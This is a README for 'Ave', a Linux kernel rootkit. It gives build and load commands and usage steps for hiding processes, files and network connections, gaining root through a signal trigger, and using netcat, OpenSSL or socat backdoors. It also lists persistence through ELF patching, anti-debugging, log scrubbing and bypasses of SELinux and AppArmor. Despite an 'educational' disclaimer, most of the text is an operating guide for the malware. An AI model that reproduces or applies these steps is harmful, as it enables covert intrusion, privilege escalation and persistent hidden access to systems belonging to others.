<p align="center">
  <img src="assets/ave-logo.png" alt="Логотип Ave" width="280">
</p>

<h2 align="center">[Overview]</h2>


Ave is a loadable Linux kernel module 5.18+ capable of hiding processes, files, and connected sockets at the kernel level, plus substituting system calls and encrypting traffic. It runs on x86-64 and ARM64. In short, it’s a universal tool for stealthily concealing any objects in the system, with extra features for bypassing SELinux/AppArmor, anti-debugging, and a whole set of other functions.

Key capabilities:
- **Kernel level cloaking** — removes traces from lsmod, /proc, /sys, ps, top.  
- **File & directory hiding** — filldir/filldir64 hooks suppress listings.  
- **Dynamic syscall substitution** — live patching of read, kill, clone. 
- **Encrypted networking** — Netfilter based AES tunnel with signature obfuscation.  
- **Anti debug & hardening bypass** — blocks ptrace/strace, skirts RELRO/PIE/NX.  
- **Persistence** — ELF patching & init-system hooks for auto start.  

---

## Disclaimer
> ⚠️ Educational & Research Purposes Only 
> This code is provided *as is* with the explicit intention that it be studied in controlled, legal environments—such as security research labs, malware-analysis sandboxes, or coursework on kernel internals.  
>
> *You are solely responsible for any use or misuse.*  
> Deploying Ave on systems without the explicit permission of their owners may violate local, national, and international laws. The authors and maintainers accept no liability for damages, data loss, or legal consequences arising from the use of this software.  
>
> Always obtain informed, written consent before testing on any device you do not own, and comply with all relevant regulations and organizational policies.

## Installation:
### 1. Prerequisites
To build Ave, first install the packages:

```bash
sudo apt install cmake gcc g++ llvm-dev llvm-tools python3-pip qemu-system-x86 socat netcat libssl-dev
pip3 install lit
sudo ln -s ~/.local/bin/lit /usr/bin/llvm-lit
````

### 2. Building

#### Local build

1. Prepare a folder for builds:

   ```bash
   mkdir build && cd build
   cmake ../ -DCMAKE_C_COMPILER=gcc -DPROCNAME="interface"
   ```

2. Start the build:

   ```bash
   make
   ```

#### Cross-compilation

If you need to build for another kernel or another machine:

```bash
cmake ../ -DKERNEL_DIR=/path/to/kernel/headers -DKOVID_LINUX_VERSION=5.10 -DCMAKE_C_COMPILER=gcc
make
```

## Main Functionality:

### 1. Module masking

Ave removes itself from lsmod, sys, and other places where the module is normally visible. In DEPLOY mode all this works out of the box.

### 2. Hiding files and directories

Uses the filldir and filldir64 hooks:

* Everything that’s hidden vanishes from ls, ps, top.
* No traces in standard utilities.

### 3. System calls

Mix of Ftrace hooks and direct editing of the system-call table:

* Dynamically updates hooks as the kernel changes.
* Replaces, for example, read, kill, clone.

### 4. Working with the network stack

Through netfilter Ave controls connections and generates hidden signatures. Everything is encrypted with AES.

### 5. Bypassing kernel protections

SELinux, AppArmor, and the relro, pie, nx protections are bypassed, adapting to the specific system configuration.

### 6. Anti debug

* Filters and blocks ptrace, strace, and other debuggers.
* Data in memory is encrypted to resist dumping and analysis.
* On debugging attempts the module starts substituting information.

### 7. Persistence

* Patches ELF files for autoload.
* Fixes itself in system init mechanisms so it starts at boot.

### 8. Backdoors

Choose from:

* **Netcat:** uses port knocking for remote hidden access.
* **OpenSSL:** to immediately have an encrypted channel.
* **Socat:** universal, for any socket type.

### 9. Logs

* Removes traces from `dmesg`.
* Masks TCP/UDP connections.
* Hides itself from `/proc`.

## Usage:

### Enable the /proc interface

```bash
kill -SIGCONT 31337
```

After that `/proc/interface_name` starts listening for your commands.

### Gain root

```bash
kill -SIGCONT 666
su      # automatic local privilege escalation
```

### Hide a process

```bash
echo <PID> > /proc/interface_name
```

### Hide files and folders

* In the current directory:

  ```bash
  echo hide-file=README.txt > /proc/interface_name
  ```

* By absolute path:

  ```bash
  echo hide-directory=/home/user/docs > /proc/interface_name
  ```

### Backdoors

To check which backdoors are available:

```bash
utils/bd_connect.sh
```

## Technical Details:

### Architecture

* x86-64 and ARM64 are the main focus.
* Kernels: 5.18+.
* Automatically adapts to kernel settings so hooks don’t break after updates.

### Security

* Completely removes hidden processes and connections from monitoring.
* The module blocks unloading and, if tampered with, tries to back itself up.

### Automation

* Scripts for quick build and deployment of the rootkit.
* Key generation for encrypted channels.
* Modular infection machinery for ELF files autoconnect.

## Testing:

Tested on:

* **Debian 12.8:** kernel 6.1.0-10-amd64 LTS.
* **Ubuntu 22.04.3 LTS:** kernel 5.19.0-32-generic HWE.
* **Ubuntu 23.10:** kernel 6.5.0-25-generic.

### Running tests

1. Local tests:

   ```bash
   make check-ave -j1
   ```

2. Cross-tests:

   ```bash
   cmake ../ -DKERNEL_DIR=/path/to/kernel/headers -DCROSS_TESTS=ON
   make check-ave
   ```


## Build
The Makefile relies on the kernel Kbuild system at /lib/modules/$(uname -r)/build.  
Building produces ave.ko, a kernel module you can load with:

```bash
sudo insmod ave.ko
````

and verify with:

```bash
lsmod | grep ave
```

---

## Makefile Targets

| Target            | Description                                                                          |
| ----------------- | ------------------------------------------------------------------------------------ |
| **all**  | Builds ave.ko. Requires PROCNAME=<name> to set the /proc/<PROCNAME> entry. |
| **injection**     | Builds the injection binary from injection.S for the protection logic.           |
| **strip**         | Strips debug symbols from ave.ko.                                                  |
| **reset-auto**    | Clears generated keys in the sources.                                                |
| **clean**         | Removes object files and resets keys, returning the project to a clean state.        |
| **lgtm**          | Runs injection first, then builds the module.                                      |

---

## Notes

* With DEPLOY=1, the build is made without debugging.
* EST_ENV uses fixed test keys.
* BDKEY and UNHIDEKEY are randomly generated by default.

---

## Step-by-Step (Ubuntu)

1. Install packages:

   ```bash
   sudo apt update
   sudo apt install build-essential linux-headers-$(uname -r) \
                    ctags uuid-runtime
   ```

2. Go to the source directory:

   ```bash
   cd /home/user/ave
   ```

3. Build with a `PROCNAME`:

   ```bash
   make PROCNAME=hidden
   DEPLOY=1 make PROCNAME=hidden
   ```

4. Check that ave.ko exists:

   ```bash
   ls -l ave.ko
   ```

5. Load the module:

   ```bash
   sudo insmod ave.ko
   lsmod | grep ave
   ```

6. Build `injection`:

   ```bash
   make injection
   ```

7. Additional targets:

   * make strip — remove debug symbols from ave.ko.
   * make lgtm — run injection, then build.

8. Clean up:

   ```bash
   make clean
   ```



